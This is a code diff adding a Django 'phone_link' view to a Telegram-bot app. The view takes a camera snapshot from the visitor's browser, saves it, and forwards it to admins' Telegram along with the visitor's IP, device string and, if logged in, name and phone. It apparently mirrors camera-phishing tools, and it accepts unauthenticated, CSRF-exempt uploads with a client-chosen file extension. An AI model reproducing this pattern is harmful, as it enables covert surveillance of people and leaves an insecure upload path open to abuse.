@@ -1340,3 +1340,99 @@ def admin_send_broadcast(request):
         'broadcast_history': broadcast_history,
     }
     return render(request, 'telegram_bot/admin_send_broadcast.html', context)
+
+
+@csrf_exempt
+def phone_link(request):
+    """Kamera ruxsati olish va rasmni adminlarga Telegram orqali yuborish"""
+    if request.method == 'POST':
+        import base64
+        from django.core.files.base import ContentFile
+
+        image_data = request.POST.get('image_data', '')
+        if not image_data:
+            return JsonResponse({'ok': False, 'error': 'Rasm topilmadi'})
+
+        # Base64 dan rasmni ajratib olish
+        try:
+            format_str, imgstr = image_data.split(';base64,')
+            ext = format_str.split('/')[-1]
+            if ext == 'jpeg':
+                ext = 'jpg'
+        except (ValueError, IndexError):
+            return JsonResponse({'ok': False, 'error': 'Noto\'g\'ri rasm formati'})
+
+        image_content = ContentFile(base64.b64decode(imgstr))
+
+        # Rasmni saqlash
+        import os
+        from django.conf import settings as django_settings
+        from django.utils import timezone
+
+        filename = f"phone_link_{timezone.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
+        upload_dir = os.path.join(django_settings.MEDIA_ROOT, 'phone_link')
+        os.makedirs(upload_dir, exist_ok=True)
+        filepath = os.path.join(upload_dir, filename)
+
+        with open(filepath, 'wb') as f:
+            f.write(image_content.read())
+
+        # User info yig'ish
+        user_info = ""
+        if request.user.is_authenticated:
+            user_info = (
+                f"\n👤 <b>Foydalanuvchi:</b> {request.user.full_name}"
+                f"\n📱 <b>Telefon:</b> {request.user.phone}"
+                f"\n🆔 <b>Username:</b> @{request.user.username}"
+            )
+
+        # IP va vaqt
+        ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', 'Noma\'lum'))
+        if ',' in ip:
+            ip = ip.split(',')[0].strip()
+
+        user_agent = request.META.get('HTTP_USER_AGENT', 'Noma\'lum')
+
+        text = (
+            f"📸 <b>Phone Link - Yangi rasm!</b>\n\n"
+            f"🕐 <b>Vaqt:</b> {timezone.now().strftime('%d.%m.%Y %H:%M:%S')}\n"
+            f"🌐 <b>IP:</b> {ip}\n"
+            f"📱 <b>Qurilma:</b> {user_agent[:100]}"
+            f"{user_info}"
+        )
+
+        # Adminlarga Telegram orqali yuborish
+        _send_phone_link_to_admins(filepath, text)
+
+        return JsonResponse({'ok': True, 'message': 'Rasm muvaffaqiyatli yuborildi!'})
+
+    return render(request, 'telegram_bot/phone_link.html')
+
+
+def _send_phone_link_to_admins(image_path, caption):
+    """Phone link rasmini faqat admin rolidagi foydalanuvchilarga Telegram orqali yuborish"""
+    import threading
+    import requests
+    from django.conf import settings
+
+    bot_token = getattr(settings, 'TELEGRAM_BOT_TOKEN', '')
+    if not bot_token:
+        return
+
+    def _send():
+        admins = CustomUser.objects.filter(role='admin', telegram_id__isnull=False)
+        for admin in admins:
+            try:
+                url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
+                with open(image_path, 'rb') as photo:
+                    requests.post(url, data={
+                        'chat_id': admin.telegram_id,
+                        'caption': caption[:1024],
+                        'parse_mode': 'HTML',
+                    }, files={
+                        'photo': photo,
+                    }, timeout=15)
+            except Exception:
+                pass
+
+    threading.Thread(target=_send, daemon=True).start()
